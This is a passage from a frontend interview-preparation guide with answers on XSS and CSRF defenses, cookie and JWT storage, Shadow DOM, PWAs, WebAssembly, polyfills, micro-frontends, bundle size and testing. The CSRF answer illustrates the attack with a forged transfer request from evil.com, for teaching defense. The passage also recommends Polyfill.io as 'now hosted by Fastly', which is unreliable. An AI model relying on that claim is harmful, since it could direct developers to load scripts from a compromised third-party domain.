4. **Trusted Types API** -- Forces all dangerous DOM sinks (`innerHTML`, `eval`) to only accept "Trusted" values, not raw strings. This is the most recent browser-level defense against DOM XSS.

5. **Sanitization** -- For rich text editors where you *must* accept HTML input, use a strict sanitizer like DOMPurify. Never build your own HTML sanitizer.

**What interviewers are really testing:** Whether you understand XSS as a layered defense problem, not just "escape output." Mentioning CSP nonces and Trusted Types shows depth beyond OWASP 101.

**Red flag answer:** "React prevents XSS" (it prevents *some* XSS but not all). Not knowing about CSP. Suggesting regex-based input filtering as the primary defense.

**Follow-up:**

<Accordion title="42. CSRF (Cross-Site Request Forgery)">
**Answer:**

CSRF exploits the browser's automatic cookie inclusion behavior. If a user is logged into `bank.com`, a malicious site `evil.com` can make a request to `bank.com/transfer?to=attacker&amount=1000` -- and the browser will automatically attach the user's session cookie, authenticating the malicious request.

**Why this works:**
- Cookies are sent automatically with every request to their origin, regardless of which site initiated the request.
- The malicious request is indistinguishable from a legitimate one to the server (same cookies, same headers).

**Defense strategies:**

1. **SameSite Cookies (primary defense):**
```
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```
- `SameSite=Strict` -- Cookie is only sent on requests from the same site. Never sent on cross-site requests. This can break legitimate flows (clicking a link from email to your site won't include the cookie).
- `SameSite=Lax` (default in modern browsers) -- Cookie is sent on top-level navigations (clicking a link) but not on cross-origin subresource requests (fetch, form POSTs from other sites). This blocks most CSRF while maintaining usability.
- `SameSite=None; Secure` -- Cookie is sent cross-site (required for third-party cookies, embeds). Must be `Secure`.

2. **Anti-CSRF Tokens (Synchronizer Token Pattern):**
   - Server generates a unique token per session, embeds it in forms as a hidden field.
   - Server validates the token on form submission. The attacker's cross-origin page can't read the token (Same-Origin Policy prevents it).
   - **Double-submit cookie pattern:** Send the token as both a cookie and a request header/body. The server checks they match. Simpler because no server-side token storage is needed.

3. **Origin/Referer Header Validation:**
   - Server checks `Origin` or `Referer` header matches expected domain. Not bulletproof (headers can be stripped by proxies/privacy settings) but adds a layer.

4. **Custom Request Headers:**
   - Require a custom header (like `X-Requested-With`) on API requests. Cross-origin forms can't set custom headers without CORS preflight, which the attacker's origin wouldn't pass.

**Modern context:** With `SameSite=Lax` as the default in all major browsers since 2020, CSRF is significantly less of a threat than it used to be. However, you still need explicit protection for: (1) `SameSite=None` cookies (third-party/embed scenarios), (2) older browsers, and (3) subdomain attacks where `site` is the same.

**What interviewers are really testing:** Whether you understand the root cause (automatic cookie inclusion) and can reason about which defenses layer together. Knowing that `SameSite=Lax` is the default now shows current awareness.

**Red flag answer:** Not understanding why cookies make CSRF possible. Only knowing about CSRF tokens without understanding `SameSite`. Thinking CORS prevents CSRF (it doesn't -- CORS controls reading responses, not sending requests).

**Follow-up:**
- Does CORS prevent CSRF? Why or why not?
- How does `SameSite=Lax` differ from `SameSite=Strict`, and why is Lax the default?
- In a SPA that uses JWT in localStorage instead of cookies, is CSRF still a concern? What new risks does this create?
</Accordion>

<Accordion title="43. LocalStorage vs Cookies vs SessionStorage">
**Answer:**

These are the three primary client-side storage mechanisms, each with fundamentally different characteristics:

| Feature | Cookie | LocalStorage | SessionStorage |
|---|---|---|---|
| Size | ~4KB per cookie | ~5-10MB | ~5-10MB |
| Sent to server | Yes, automatically on every request | No | No |
| Lifetime | Configurable (session or persistent via `Expires`/`Max-Age`) | Persistent (until manually cleared) | Per-tab (cleared on tab close) |
| JS Access | `document.cookie` (unless `HttpOnly`) | `localStorage.getItem()` | `sessionStorage.getItem()` |
| Scope | Per domain + path | Per origin | Per origin + per tab |
| XSS vulnerability | `HttpOnly` flag blocks JS access | Always accessible via JS | Always accessible via JS |

**Cookies (when to use):**
- **Session management** (authentication tokens) -- Because they're sent automatically with requests and can be protected with `HttpOnly`, `Secure`, `SameSite`.
- **Server-side personalization** -- Preferences the server needs to read (language, theme for SSR).
- **Tracking** (with consent) -- Third-party cookies for analytics/ads (being phased out).
- **Gotcha:** Every cookie is sent on every request to that domain, including images and static assets. 20 cookies at 4KB each = 80KB of overhead on every request. Solution: serve static assets from a cookie-free domain/subdomain.

**LocalStorage (when to use):**
- **Client-side preferences** -- Theme, language, UI state that doesn't need server awareness.
- **Offline data / caching** -- Draft content, cached API responses.
- **Never for authentication tokens** -- Any XSS vulnerability can read LocalStorage. There's no equivalent of `HttpOnly`.
- **Gotcha:** Synchronous API. `localStorage.getItem()` blocks the main thread. For large reads/writes, this can cause jank. Also: storage events only fire in *other* tabs (not the tab that made the change), which makes cross-tab synchronization patterns work.

**SessionStorage (when to use):**
- **Per-tab state** -- Form wizard progress, scroll positions, temporary UI state.
- **Key property:** Opening a link in a new tab creates a new SessionStorage context (isolated from the original tab). This is useful for multi-tab workflows where each tab should have independent state.

**Modern alternatives:**
- **IndexedDB** -- Asynchronous, structured, supports large data (hundreds of MB). Use for: offline-first apps, large datasets, binary data (images, files). Libraries like Dexie.js simplify the awful native API.
- **Cache API** -- For caching HTTP responses (used with Service Workers).
- **Origin Private File System (OPFS)** -- Newest storage API, provides file-system-like access with high-performance reads/writes. Used by apps like SQLite-in-the-browser (wa-sqlite, sql.js).

**What interviewers are really testing:** Whether you understand the security implications of each storage mechanism and can choose the right one for a given use case. The "never store auth tokens in LocalStorage" rule and the cookie overhead problem are key signals.

**Red flag answer:** Storing JWTs in LocalStorage without acknowledging the XSS risk. Not knowing about `HttpOnly` cookies. Not knowing about IndexedDB for larger storage needs.

**Follow-up:**
- Why should authentication tokens never be stored in LocalStorage, and what is the recommended alternative?
- How does the `storage` event work, and how would you use it for cross-tab state synchronization?
- When would you use IndexedDB over LocalStorage, and what are the DX challenges?
</Accordion>

<Accordion title="44. JWT Storage and Authentication">
**Answer:**

Where you store JWTs is a security-critical decision with no perfect answer -- only trade-offs.

**Option 1: HttpOnly Secure Cookie (recommended for most apps):**
```
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900
```
- **Pros:** JavaScript cannot read or steal it (XSS-resistant). Sent automatically with requests (no custom code needed). Can be protected with `SameSite` against CSRF.
- **Cons:** Requires CSRF protection (though `SameSite=Lax` handles most cases). Harder to use with third-party APIs on different domains. Cookie size limits (~4KB) may be tight for large JWTs.
- **Pattern:** Store only a short-lived access token in the cookie. Use a separate `refresh_token` cookie (also HttpOnly, Secure, SameSite=Strict, narrower Path like `/auth/refresh`) for token renewal.

**Option 2: In-memory (JavaScript variable) + Refresh Token Cookie:**
- Access token stored in a JavaScript variable (closure, module scope, React context -- NOT state that persists to localStorage).
- Refresh token in an HttpOnly cookie.
- **Pros:** Access token is unreachable via XSS *and* not sent automatically (no CSRF). Best of both worlds.
- **Cons:** Access token is lost on page refresh. Must silently refresh on every page load (call `/auth/refresh` on mount).
- This is the pattern Auth0, Okta, and most modern auth libraries recommend.

**Option 3: LocalStorage (common but risky):**
- **Pros:** Simple implementation. Works with `Authorization: Bearer` header pattern. Works cross-domain easily.
- **Cons:** Any XSS vulnerability exposes the token. One stored XSS in a third-party script gives full account access. There is no mitigation -- if JS can run, it can read LocalStorage.
- **When it might be acceptable:** Internal tools behind a VPN with strict CSP. Apps where the session token grants minimal privilege.

**Token architecture best practices:**
- **Short-lived access tokens** (5-15 minutes). Limits damage window if stolen.
- **Long-lived refresh tokens** (days/weeks) stored as HttpOnly cookie with rotation (each use invalidates the old refresh token and issues a new one -- detects token theft).
- **Token introspection or revocation** -- Maintain a server-side denylist for compromised tokens. Pure stateless JWT means you can't revoke until expiry.

**What interviewers are really testing:** Whether you understand the security model deeply enough to make an informed trade-off. The "in-memory + refresh cookie" pattern shows you've actually thought about this, not just read a tutorial.

**Red flag answer:** "I store JWTs in LocalStorage" without acknowledging the XSS risk. "JWTs are stateless so you never need a server-side session" -- this ignores the revocation problem.

**Follow-up:**
- If JWTs are "stateless," how do you handle token revocation (e.g., user changes password, admin deactivates account)?
- Walk me through the "silent refresh" flow: what happens when the in-memory access token expires?
- Compare the security profiles of cookie-based sessions vs JWT-based authentication. When would you choose each?
</Accordion>

<Accordion title="45. Shadow DOM">
**Answer:**

The Shadow DOM provides **true DOM and CSS encapsulation** -- styles and selectors inside a shadow root don't leak out, and external styles don't reach in (with some exceptions).

**How it works:**
```javascript
const host = document.querySelector('.widget');
const shadow = host.attachShadow({ mode: 'open' });
shadow.innerHTML = `
  <style>
    p { color: red; } /* Only affects this shadow tree */
  </style>
  <p>This is encapsulated!</p>
`;
```
- External CSS `p { color: blue; }` will NOT affect the paragraph inside the shadow.
- The shadow's `p { color: red; }` will NOT leak to the main document.

**`mode: 'open'` vs `mode: 'closed'`:**
- `open` -- The shadow root is accessible via `element.shadowRoot`. Most Web Components use this.
- `closed` -- `element.shadowRoot` returns `null`. Used by browser built-ins (`<video>` controls, `<input type="range">`). In practice, `closed` provides security theater -- JavaScript can still access internals through other means.

**CSS encapsulation nuances:**
- **Inherited properties** (like `color`, `font-family`) DO cross the shadow boundary. The shadow tree inherits from the host element.
- **CSS Custom Properties** cross the shadow boundary (they inherit). This is the intended theming mechanism: set `--primary-color` outside, use it inside the shadow.
- **`::part()` pseudo-element** -- Shadow DOM can expose named parts for external styling:
```html
<!-- Inside shadow DOM -->
<button part="action-button">Click me</button>

<!-- External CSS can style it -->
my-component::part(action-button) { background: blue; }
```

**Web Components = Custom Elements + Shadow DOM + Templates:**
```javascript
class MyCard extends HTMLElement {
  constructor() {
    super();
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = `
      <style>/* scoped styles */</style>
      <slot name="title"></slot>
      <slot></slot>
    `;
  }
}
customElements.define('my-card', MyCard);
```
**`<slot>`** enables content projection: external content is rendered inside the shadow tree without losing its external styling context.

**Shadow DOM in the framework ecosystem:**
- **Lit** -- Google's library for building Web Components with Shadow DOM. Lightweight, production-ready.
- **React** -- Historically poor Shadow DOM support (`react-shadow` library helps). React's synthetic event system doesn't work well across shadow boundaries.
- **Angular** -- Supports `ViewEncapsulation.ShadowDom` natively.
- **Use case for framework teams:** Design system components distributed as Web Components work across React, Vue, Angular teams. Companies like ING Bank, Salesforce (Lightning Web Components), and GitHub use this pattern.

**What interviewers are really testing:** Whether you understand encapsulation at the platform level. The CSS inheritance nuance (inherited properties cross boundaries) and the theming pattern (CSS Custom Properties) are the key insights.

**Red flag answer:** "Shadow DOM isolates everything completely" (inherited CSS properties still cross). Not knowing about `::part()` or `<slot>`. Thinking Shadow DOM is the same as React's virtual DOM.

**Follow-up:**
- How do CSS Custom Properties enable theming across Shadow DOM boundaries?
- What is the difference between Shadow DOM and Virtual DOM? Why do people confuse them?
- Your company has React, Vue, and Angular teams. How would Web Components with Shadow DOM help create a shared design system?
</Accordion>

<Accordion title="46. PWA (Progressive Web App)">
**Answer:**

A PWA is a web application that uses modern web APIs to deliver an app-like experience: installable, offline-capable, and engaging -- while maintaining the reach and accessibility of the web.

**The three pillars:**

1. **Web App Manifest (`manifest.json`):**
```json
{
  "name": "My App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#3b82f6",
  "icons": [
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" }
  ]
}
```
Controls the install experience: name, icon, splash screen, display mode (`standalone` removes browser chrome).

2. **Service Worker (the engine):**
- Intercepts network requests for caching strategies.
- Enables offline functionality.
- Handles push notifications.
- Background sync (send queued requests when connectivity returns).
- Periodic background sync (refresh cached data periodically).

3. **HTTPS (required):**
- Service Workers only work on HTTPS (security requirement).
- `localhost` is the only exception (for development).

**Caching strategies for different resources:**
- **Cache-First (Offline-First):** Check cache, fall back to network. Best for static assets (JS, CSS, images).
- **Network-First:** Try network, fall back to cache. Best for API requests where freshness matters.
- **Stale-While-Revalidate:** Serve from cache immediately, update cache in background. Best for content that changes but staleness is acceptable.
- **Workbox** (Google) is the de facto library for implementing these strategies declaratively.

**The app-like experience features:**
- **Install prompt** (beforeinstallprompt event) -- Prompt users to install at the right moment.
- **Push notifications** -- Re-engage users. Requires explicit permission (Push API + Notification API).
- **Background sync** -- Queue failed requests and retry when online.
- **Badging API** -- Show notification count on the app icon.
- **File handling API** -- Register as a handler for file types.
- **Share Target API** -- Appear in the OS share sheet.

**Real-world example:** Twitter Lite (PWA) saw 65% increase in pages per session, 75% increase in Tweets sent, and 20% decrease in bounce rate compared to their previous mobile site. The PWA was also 1/30th the size of their native Android app.

**What interviewers are really testing:** Whether you understand the Service Worker lifecycle and caching strategies, not just that PWAs are "installable websites." The caching strategy decisions are the technically interesting part.

**Red flag answer:** "A PWA is just a website with a manifest.json." Not understanding the Service Worker's role. Not knowing about caching strategies.

**Follow-up:**
- Walk me through the Service Worker update lifecycle. A user has your PWA installed and you deploy a new version. What happens?
- What is the "app shell" architecture, and how does it enable instant loading for PWAs?
- A user reports that your PWA shows stale data after you deployed a critical fix. How do you debug this?
</Accordion>

<Accordion title="47. WebAssembly (Wasm)">
**Answer:**

WebAssembly is a binary instruction format that runs in the browser at **near-native speed**. It is not a replacement for JavaScript but a complement: Wasm handles the CPU-intensive work while JavaScript handles the DOM and user interaction.

**How it works:**
1. Write code in C, C++, Rust, Go, or other languages.
2. Compile to `.wasm` binary using tools like Emscripten (C/C++), wasm-pack (Rust), or TinyGo.
3. Load and instantiate in JavaScript:
```javascript
const response = await fetch('module.wasm');
const { instance } = await WebAssembly.instantiateStreaming(response);
instance.exports.heavyComputation(data);
```

**Why it's fast:**
- Binary format = smaller than equivalent JavaScript (faster to download and parse).
- Typed and pre-compiled = no JIT warmup, no deoptimization. Performance is predictable from the first call.
- Direct memory access via `ArrayBuffer` (linear memory model).
- SIMD (Single Instruction, Multiple Data) support for data-parallel operations.

**Real-world use cases (actual production examples):**
- **Figma** -- Rendering engine compiled from C++ to Wasm. 3x faster than their previous asm.js implementation.
- **Google Earth** -- 3D globe rendering in the browser via Wasm.
- **Photoshop Web** -- Adobe ported core image processing to Wasm.
- **SQLite in the browser** (wa-sqlite, sql.js) -- Full SQL database running client-side.
- **Video/audio codecs** -- FFmpeg compiled to Wasm for client-side transcoding.
- **AI/ML inference** -- TensorFlow models running in-browser via Wasm + SIMD.
- **Game engines** -- Unity and Unreal Engine export to Wasm.

**Limitations:**
- No direct DOM access -- must call JavaScript for any DOM manipulation.
- No direct GC integration (yet) -- Wasm GC proposal is being implemented, enabling languages like Kotlin and Dart to compile to Wasm more efficiently.
- Linear memory model -- Wasm has its own memory space. Passing complex data between JS and Wasm requires serialization (or shared `ArrayBuffer`).
- **Threading:** Wasm threads require `SharedArrayBuffer`, which requires Cross-Origin Isolation headers.

**WASI (WebAssembly System Interface):**
- A standardized API for Wasm to run outside the browser (server-side, edge compute).
- "Write once, run anywhere" -- Cloudflare Workers uses Wasm for edge compute. Docker founder: "If WASM+WASI existed in 2008, we wouldn't have needed to create Docker."

**What interviewers are really testing:** Do you know when Wasm is the right tool and when it's overkill? For most web apps, JavaScript is fast enough. Wasm shines when you need computational performance, not when you need to render a form.

**Red flag answer:** "WebAssembly will replace JavaScript." It won't -- it can't access the DOM. Not knowing any real-world use cases beyond "it's fast."

**Follow-up:**
- When would you choose Wasm over optimized JavaScript? What is the threshold where Wasm becomes worthwhile?
- How does data get passed between JavaScript and WebAssembly? What are the performance implications?
- What is WASI, and why is it significant beyond the browser?
</Accordion>

<Accordion title="48. Single Page App vs Multi Page App">
**Answer:**

This is one of the most consequential architectural decisions, and the industry has been oscillating between these approaches.

**Single Page Application (SPA):**
- The browser loads a single HTML page. All navigation is handled by JavaScript (client-side routing). Content changes by dynamically updating the DOM.
- **Architecture:** HTML shell -> load JS bundle -> JS takes over rendering. Subsequent navigations are JS-driven (fetch data + render).
- **Pros:** Fluid, app-like transitions. No full-page reloads. Rich interactivity. State persists across "pages" (audio keeps playing, form state preserved).
- **Cons:**
  - **Large initial JS bundle** -- Blank screen until JS loads, parses, and executes. Code splitting mitigates but doesn't eliminate.
  - **SEO challenges** -- Crawlers must execute JS to see content (Googlebot does, but slowly and with quotas).
  - **Memory leaks** -- Long-lived sessions accumulate DOM nodes, event listeners, and closures.
  - **Accessibility challenges** -- Route changes don't trigger screen reader announcements by default. You must manage focus and announce navigation programmatically.
  - **Complexity** -- Client-side state management, routing, code splitting, hydration, error boundaries.

**Multi Page Application (MPA):**
- Each navigation is a full HTTP request/response cycle. The server returns complete HTML.
- **Architecture:** Browser requests URL -> Server renders HTML -> Browser displays.
- **Pros:** Simple mental model. Excellent SEO. Works without JS. Smaller per-page JS. No memory leak accumulation (fresh context each navigation).
- **Cons:** Full-page reload on every navigation (flash of white). No persistent client-side state. Server must render every view.

**The modern convergence:**
The sharp SPA vs MPA distinction is disappearing. Modern frameworks blend both:
- **Next.js / Nuxt / SvelteKit** -- SSR + client-side navigation (MPA for the first load, SPA for subsequent navigations).
- **Astro** -- MPA by default with optional "islands" of interactivity. Ship zero JS unless a component needs it.
- **HTMX** -- Server-rendered HTML fragments swapped into the DOM. The simplicity of MPA with partial SPA-like updates.
- **View Transitions API** -- Native browser API for smooth cross-page transitions. Eliminates the "flash of white" problem for MPAs:
```css
@view-transition { navigation: auto; }
```

**Decision framework:**
| Factor | Choose SPA | Choose MPA |
|---|---|---|
| Rich interactivity (real-time, drag/drop) | Yes | |
| SEO-critical content | | Yes |
| Works without JavaScript | | Yes |
| Persistent audio/video across pages | Yes | |
| Small team, rapid development | | Yes |
| Content-heavy site (blog, docs) | | Yes |

**What interviewers are really testing:** Whether you can articulate the trade-offs beyond the surface level and whether you know about the modern convergence. Mentioning View Transitions API, Astro, or HTMX shows you're current.

**Red flag answer:** "SPAs are always better because they feel faster." Or: "MPAs are outdated." Both ignore the nuance. Not knowing that modern frameworks blend both approaches.

**Follow-up:**
- How does the View Transitions API change the MPA vs SPA trade-off?
- Your company is building a content-heavy marketing site with a few interactive widgets. What architecture do you recommend?
- How does Astro's Islands Architecture compare to Next.js for content-focused sites?
</Accordion>

<Accordion title="49. Polyfills vs Transpilers">
**Answer:**

These solve different parts of the browser compatibility problem:

**Transpiler (syntax transformation):**
- Converts **new syntax** to older syntax that older browsers understand.
- **Babel** (the original): ES2015+ syntax -> ES5. Arrow functions, classes, optional chaining, destructuring. Babel reads the output through plugins/presets and transforms AST nodes.
- **SWC** (Rust-based, used by Next.js): 20-70x faster than Babel. Drop-in replacement for most use cases.
- **esbuild** (Go-based): Primarily a bundler but includes transpilation. Extremely fast.
- **TypeScript compiler (tsc)**: Strips type annotations and can downlevel syntax.

**Example transformation:**
```javascript
// Input (ES2020)
const name = user?.profile?.name ?? 'Anonymous';

// Output (ES5)
var _user$profile;
var name = (_user$profile = user === null || user === void 0
  ? void 0
  : user.profile) === null || _user$profile === void 0
  ? void 0
  : _user$profile.name;
if (name === null || name === void 0) name = 'Anonymous';
```

**Polyfill (API gap-filling):**
- Provides runtime **implementations of missing APIs** in older browsers.
- `Promise`, `fetch`, `Array.prototype.includes`, `Object.entries`, `IntersectionObserver`, `ResizeObserver`.
- **core-js** -- The most comprehensive polyfill library (used by `@babel/preset-env`).
- `@babel/preset-env` with `useBuiltIns: 'usage'` automatically injects only the polyfills needed for your target browsers and your actual code usage. This is the modern approach vs importing all polyfills upfront.

**The key distinction:**
- Transpilers handle **syntax** (new ways of writing code): `?.`, `??`, `=>`, `class`, `async/await`.
- Polyfills handle **APIs** (new functionality): `Promise`, `fetch`, `Map`, `Set`, `Intl`.
- Some features need both: `async/await` needs transpilation (syntax) AND polyfilling (`regenerator-runtime` or `Promise`).

**Modern approach (2024+):**
- **Baseline Widely Available** -- Target browsers that support a feature for 30+ months. Eliminates most polyfill needs.
- **Differential loading / module/nomodule pattern:**
```html
<script type="module" src="modern.js"></script>
<script nomodule src="legacy.js"></script>
```
Modern browsers execute the module script (smaller, no polyfills). Legacy browsers execute the nomodule script (transpiled + polyfilled).
- **Polyfill.io** service (now hosted by Fastly) dynamically serves only the polyfills the requesting browser needs based on User-Agent.

**What interviewers are really testing:** Whether you understand the syntax vs API distinction and can design a browser-compatibility strategy that minimizes bundle size for modern browsers while maintaining legacy support.

**Red flag answer:** Using "polyfill" and "transpiler" interchangeably. Shipping all polyfills to all browsers. Not knowing about `@babel/preset-env` with `useBuiltIns: 'usage'`.

**Follow-up:**
- How does `@babel/preset-env` with `useBuiltIns: 'usage'` decide which polyfills to include?
- What is the `module/nomodule` pattern, and why is it useful for serving different bundles to different browsers?
- You need to support IE11 for one enterprise client while serving a lean bundle to modern browsers. How do you architect this?
</Accordion>

<Accordion title="50. Micro-Frontends">
**Answer:**

Micro-frontends extend the microservices philosophy to the frontend: independently deployable, team-owned frontend applications composed into a single user experience.

**Why they exist (the problem they solve):**
At scale (50+ frontend developers), a monolithic SPA becomes a bottleneck:
- Deploy queues: one team's bug blocks everyone's release.
- Shared dependency hell: upgrading React in one team's code breaks another team's.
- Ownership ambiguity: who owns `shared/utils`?
- Onboarding complexity: new developers face the entire codebase.

**Integration patterns (from loosest to tightest coupling):**

1. **Build-time composition (npm packages):**
   - Each micro-frontend is published as an npm package, imported by a "shell" app.
   - **Pros:** Simple, type-safe, familiar.
   - **Cons:** Not independently deployable (requires shell rebuild). Shared dependency versions.

2. **Runtime via iframes:**
   - Each micro-frontend runs in its own `<iframe>`.
   - **Pros:** True isolation (separate JS context, styles, DOM). Crash-proof.
   - **Cons:** Performance overhead. No shared styling. Communication via `postMessage` only. Breaks accessibility (focus management, screen readers). SEO impossible.

3. **Runtime via JavaScript (single-spa, qiankun):**
   - A router/orchestrator mounts/unmounts micro-frontend applications at designated DOM nodes.
   - **Pros:** Independently deployable. Shared shell (header, nav).
   - **Cons:** Shared global scope. CSS leakage unless using Shadow DOM or CSS Modules. Framework interop complexity.

4. **Module Federation (Webpack 5 / Vite):**
   - Micro-frontends expose and consume modules at runtime. No rebuild needed.
   - **Pros:** Share dependencies dynamically (React loaded once). Independent builds and deploys. Feels like a monolith to the user.
   - **Cons:** Webpack-specific (though Vite now supports it via plugins). Versioning complexity.

5. **Server-side composition (Edge-Side Includes, Tailor):**
   - Assemble HTML fragments from different services at the server/edge level.
   - **Pros:** Works without JS. SEO-friendly.
   - **Cons:** Limited interactivity between fragments. Complexity at the server layer.

**Real-world examples:**
- **IKEA** -- Different teams own different sections of the website (product listing, cart, checkout). Module Federation.
- **Spotify** -- Desktop app uses iframes for independent squad ownership.
- **Zalando** -- Project Mosaic for server-side micro-frontend composition.

**When NOT to use micro-frontends:**
- Small team (&lt; 10 developers) -- The coordination overhead exceeds the benefits.
- Homogeneous tech stack with good CI/CD -- A monorepo with code owners and good testing may be simpler.
- When you actually need "shared library" not "separate app" -- Don't use micro-frontends for shared components.

**What interviewers are really testing:** Can you articulate when micro-frontends are worth the complexity? The answer should always start with the organizational problem (team autonomy at scale), not the technology.

**Red flag answer:** "We should use micro-frontends because microservices are good." Not addressing the significant downsides: shared state management, inconsistent UX, performance overhead, complex CI/CD.

**Follow-up:**
- How do micro-frontends share global state (authenticated user, theme, locale)?
- You have two micro-frontends, one using React 17 and one using React 18. How do you prevent loading React twice?
- Your micro-frontend architecture is causing performance issues because of duplicate dependencies. How do you diagnose and fix this?

<Accordion title="51. Web Components vs Framework Components">
**Answer:**

This question gets at a fundamental tension in frontend architecture: platform standards vs framework ergonomics.

**Web Components (platform standard):**
- **Custom Elements** -- Define new HTML tags with `customElements.define()`.
- **Shadow DOM** -- Encapsulate styles and DOM.
- **HTML Templates** -- `<template>` and `<slot>` for declarative composition.
- **No build step required** -- Works in vanilla HTML.
- **Framework-agnostic** -- A Web Component works in React, Vue, Angular, Svelte, or plain HTML.

**Framework Components (React, Vue, Svelte):**
- More ergonomic DX: JSX, reactive state, declarative rendering, rich ecosystem.
- Better tooling: hot module replacement, DevTools extensions, testing libraries.
- Larger community and ecosystem.

**When to use Web Components:**
- **Shared design systems** across framework-diverse teams. If Team A uses React and Team B uses Vue, Web Components are the common denominator.
- **Embeddable widgets** -- A chat widget or payment form that customers embed in their sites (any framework).
- **Long-lived components** -- Platform standards outlast frameworks. A Web Component from 2018 still works; a React class component from 2018 needs migration.

**When to use Framework Components:**
- **Within a single-framework app** -- The DX advantages are overwhelming. No reason to use Web Components inside a pure React app.
- **Complex stateful UIs** -- Framework reactivity systems are more ergonomic than manual property/attribute observation.
- **Performance-sensitive rendering** -- Virtual DOM diffing and signals-based reactivity can be more efficient than Web Component property watchers for complex update patterns.

**The interop challenge:**
- React's JSX doesn't pass complex objects as properties to Custom Elements (only strings via attributes). React 19 improved this significantly with better Custom Element support.
- Event handling: Custom Events from Web Components need manual listeners in React (`ref.current.addEventListener()`).
- SSR: Web Components require special handling for server rendering (Declarative Shadow DOM is the emerging solution).

**What interviewers are really testing:** Whether you understand the role of platform standards vs framework abstractions and can make a pragmatic choice based on the specific context.

**Red flag answer:** "Web Components are the future and will replace React." Or: "Web Components are dead because everyone uses React." Both miss the nuance of when each is appropriate.

**Follow-up:**
- How would you architect a design system that needs to work across React, Vue, and Angular?
- What is Declarative Shadow DOM, and why is it important for SSR of Web Components?
- What are the interop challenges between React and Web Components, and how has React 19 improved this?
</Accordion>

<Accordion title="52. JavaScript Bundle Optimization">
**Answer:**

Bundle size directly impacts load time, parse time, and interactivity. Every kilobyte matters, especially on mobile networks.

**Analysis (measure before you optimize):**
- **`webpack-bundle-analyzer`** -- Visual treemap of bundle contents. Immediately reveals oversized dependencies.
- **`source-map-explorer`** -- Maps bytes to source files via source maps.
- **`bundlephobia.com`** -- Check dependency size (minified + gzipped) and tree-shakeability *before* installing.
- **Chrome DevTools Coverage tab** -- Shows how much of loaded JS/CSS is actually used. Typically 60-80% of shipped JS is unused on any given page.

**Optimization strategies (ordered by typical impact):**

1. **Replace heavyweight dependencies:**
   - `moment.js` (67KB gzipped) -> `date-fns` (tree-shakeable, import only what you use) or native `Intl.DateTimeFormat`.
   - `lodash` (69KB) -> `lodash-es` (tree-shakeable) or native methods.
   - `chart.js` (entire lib) -> import only the chart types and components you use.

2. **Code splitting** (see Q25): Route-based and component-based lazy loading.

3. **Tree shaking** (see Q26): Ensure ESM imports, check `sideEffects` in package.json.

4. **Dynamic imports for heavy features:**
```javascript
// Load PDF library only when user clicks "Export PDF"
async function exportPDF() {
  const { jsPDF } = await import('jspdf');
  const doc = new jsPDF();
  // ...
}
```

5. **Externalize rarely-changing dependencies:** Load React from a CDN (`react.production.min.js`) with SRI (Subresource Integrity) hashes. This leverages browser caching across sites.

6. **Compression:** Brotli > Gzip. Pre-compress static assets at build time (level 11).

7. **Target modern browsers only** (if you can): `esbuild` targeting `es2020` avoids transpiling async/await, optional chaining, nullish coalescing -- saving 10-30% bundle size.

**Budget enforcement:**
- Set bundle size budgets in CI: `bundlesize`, `size-limit`, or Lighthouse CI.
- Example budget: Main bundle &lt; 170KB gzipped. Per-route chunk &lt; 50KB gzipped. Total initial load &lt; 250KB gzipped.
- Fail the build if budget is exceeded. This prevents gradual bundle bloat.

**What interviewers are really testing:** Can you systematically reduce bundle size with real tools and techniques? The analysis-first approach (measure, identify, optimize) shows engineering discipline.

**Red flag answer:** "Just use code splitting." Without analysis, you don't know what to split. Not knowing about bundle analysis tools.

**Follow-up:**
- Walk me through how you would reduce a 500KB (gzipped) React app bundle to under 200KB. What is your process?
- How do you enforce bundle size budgets in a CI pipeline?
- What is the Chrome DevTools Coverage tab, and how would you use it to identify unused JavaScript?
</Accordion>

<Accordion title="53. Frontend Testing Strategy">
**Answer:**

A robust frontend testing strategy follows the **testing trophy** (Kent C. Dodds model), not the testing pyramid:

**Testing levels (from most to least ROI for frontend):**

1. **Static Analysis (foundation):**
   - TypeScript -- Catches type errors, null references, missing properties at compile time. The highest-ROI "test" you can add.
   - ESLint -- Catches code quality issues, accessibility violations (`eslint-plugin-jsx-a11y`), React anti-patterns (`eslint-plugin-react-hooks`).
   - Prettier -- Eliminates formatting debates.

2. **Integration Tests (largest slice -- the sweet spot):**
   - Test components with their dependencies (child components, hooks, context).
   - Tools: **React Testing Library** (RTL) + **Jest** or **Vitest**.
   - **Philosophy:** Test behavior, not implementation. Query by role/label/text, not by CSS selector or component internals.
```jsx
// GOOD: Tests behavior
test('shows error when submitting empty form', async () => {
  render(<LoginForm />);
  await userEvent.click(screen.getByRole('button', { name: /submit/i }));
  expect(screen.getByRole('alert')).toHaveTextContent('Email is required');
});

// BAD: Tests implementation
test('sets error state', () => {
  const { result } = renderHook(() => useForm());
  act(() => result.current.submit());
  expect(result.current.errors.email).toBe('required'); // Testing internal state
});
```

3. **End-to-End Tests (critical paths only):**
   - Tools: **Playwright** (recommended) or **Cypress**.
   - Test complete user flows: signup, checkout, core workflows.
   - **Playwright advantages:** Multi-browser (Chromium, Firefox, WebKit), faster execution, better debugging, auto-wait for elements.
   - **Keep E2E focused:** 10-20 critical-path tests, not 500 UI tests. E2E tests are slow and flaky; use them judiciously.

4. **Visual Regression Testing:**
   - **Chromatic** (Storybook-based), **Percy**, **Playwright visual comparisons**.
   - Screenshot every component, diff against baseline. Catches CSS regressions that unit tests miss.

5. **Unit Tests (selective):**
   - Pure utility functions, complex business logic, state machines, reducers.
   - Not for components (integration tests cover those better).

**Anti-patterns:**
- Testing implementation details (state values, method calls) instead of user-visible behavior.
- 100% code coverage as a goal -- leads to low-value tests that test getters/setters.
- Snapshot tests -- They're rarely reviewed meaningfully and break on any change. Use visual regression instead.

**What interviewers are really testing:** Can you design a testing strategy that maximizes confidence while minimizing maintenance cost? The integration-heavy approach (testing trophy) over unit-heavy (testing pyramid) is the modern consensus for frontend.

**Red flag answer:** "We write unit tests for every component." This usually means testing implementation details. Relying on snapshot tests for "coverage." Not mentioning E2E testing.

**Follow-up:**
- What is the difference between the testing pyramid and the testing trophy, and why is the trophy model preferred for frontend?
